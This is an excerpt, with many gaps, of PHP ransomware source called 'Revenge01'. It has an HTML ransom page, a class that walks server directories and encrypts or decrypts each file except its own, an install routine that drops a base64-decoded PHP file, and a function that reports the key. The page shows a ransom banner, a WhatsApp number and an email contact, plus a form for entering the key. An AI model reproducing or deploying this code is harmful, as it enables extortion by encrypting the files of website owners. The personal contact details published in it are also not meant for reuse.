...
<html>
<head>
   <title>INDONESIA SERVER14 RANSOM</title>
<style type="text/css">
body {
    background: #1A1C1F;
    color: #e2e2e2;
...
class deRanSomeware
{
   public function shcpackInstall(){
    if(!file_exists(".htarein")){
      ...
      if(file_put_contents("reinxceed.php", base64_decode(""))){
   ...
   public function shcdirs($dir,$method,$key){
        ...
        foreach(scandir($dir) as $d)
        {
            if($d!='.' && $d!='..')
            {
                ...
                if(!is_dir($locate)){
                   if(  deRanSomeware::kecuali($locate,"Ransom.php")  && deRanSomeware::kecuali($locate,".png")  && deRanSomeware::kecuali($locate,".htaccess")  && deRanSomeware::kecuali($locate,"ransom.php") &&  deRanSomeware::kecuali($locate,"index.php") && deRanSomeware::kecuali($locate,".htarein") ){
                     switch ($method) {
                        case '1':
   ...
   public function report($key){
        ...
        $message.= "Key     : ".$key;
        $message.= "========= Revenge01 (2020) Ransomware =========\n";
...
<center>
<pre>
<center><font color="lime"><h3>got Ransom Revenge01</h3></font></center>
<font color="red">                       
            .-""-.
           / .--. \
          / /    \ \
        ...
        ||; ::\__/:: ;
         \\\ '::::' /
          `=':-..-'`
            -[Revenge01]-
        -[my whatsapp : +628983822969]-
 -[ Contact : serverindonesia118@gmailcom ]-
</pre>
<form action="" method="post" style=" text-align: center;">
      <label>Key : </label>
      <input type="text" name="key" class="inpute" placeholder="KEYNYA ENC/DEC">
